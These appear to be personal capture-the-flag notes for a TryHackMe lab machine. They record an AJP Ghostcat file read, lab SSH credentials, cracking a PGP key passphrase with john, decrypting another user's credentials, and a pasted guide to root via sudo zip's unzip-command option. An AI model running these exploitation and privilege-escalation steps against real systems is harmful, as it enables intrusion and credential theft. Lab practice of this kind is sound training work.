python3 ajpShooter.py http://10.10.4.37:8080/ 8009 /WEB-INF/web.xml read

skyfuck:8730281lkjlkjdqlksalks
 
ssh skyfuck@10.10.4.37
password:8730281lkjlkjdqlksalks

scp skyfuck@10.10.118.169:credential.pgp .    
scp skyfuck@10.10.118.169:tryhackme.asc .   

Usage
-----

1. Run gpg2john on PGP symmetrically encrypted files (.gpg / .asc).

2. Run john on the output of gpg2john.

Example
-------

$ ../run/gpg2john test-password.asc > hash  # https://id0-rsa.pub/problem/1/

$ ../run/john hash -w=all
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password         (?)
...

└─$ gpg2john tryhackme.asc > thmoutput

File tryhackme.asc
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ cat thmoutput             
tryhackme:$gpg$*17*54*3072*713ee3f57cc950f8f89155679abe2476c62bbd286ded0e049f886d32d2b9eb06f482e9770c710abc2903f1ed70af6fcc22f5608760be*3*254*2*9*16*0c99d5dae8216f2155ba2abfcc71f818*65536*c8f277d2faf97480:::tryhackme <stuxnet@tryhackme.com>::tryhackme.asc
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt thmoutput 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)     
1g 0:00:00:00 DONE (2022-11-15 00:16) 33.33g/s 35733p/s 35733c/s 35733C/s theresa..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ gpg --import tryhackme.asc                                
gpg: keybox '/home/kali/.gnupg/pubring.kbx' created
gpg: /home/kali/.gnupg/trustdb.gpg: trustdb created
gpg: key 8F3DA3DEC6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key 8F3DA3DEC6707170: secret key imported
gpg: key 8F3DA3DEC6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
                                                                                                                                                            
┌──(kali㉿kali)-[~]
└─$ gpg --decrypt credential.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG key, ID 61E104A66184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j    

Sudo Rights Lab setups for Privilege Escalation

The behaviour of zip gets changed when running with higher privilege. Let’s suppose the system admin had given sudo permission to the local user to run zip. This is can be led to privilege escalation once the system is compromised. So here we are going to put test user in the sudoers file so that test user has root the privileges to run zip command as sudo user.

Now imagine can we have Privilege shell of victim’s pc by exploiting zip program. It’s very difficult to even think of but very easy to perform. So, let’s do that. First, go to kali’s terminal and connect ubuntu with ssh as we have done in below-

ssh test@192.168.1.108

Well-done. We have connected through ssh successfully.

Now we will run sudo -l command to check the list the entries of sudo files which are a member of the sudoers file. In the list, we can see that test is a member of the sudoers file and can run the zip program with root privilege.

Let’s exploit!!

Now first we will create a file with touch command as we have created a file raj.txt and now we will compress the raj.txt and through zip file, we are taking a shell. So that we will run the following command-

sudo zip 1.zip raj.txt -T --unzip-command="sh -c /bin/bash"
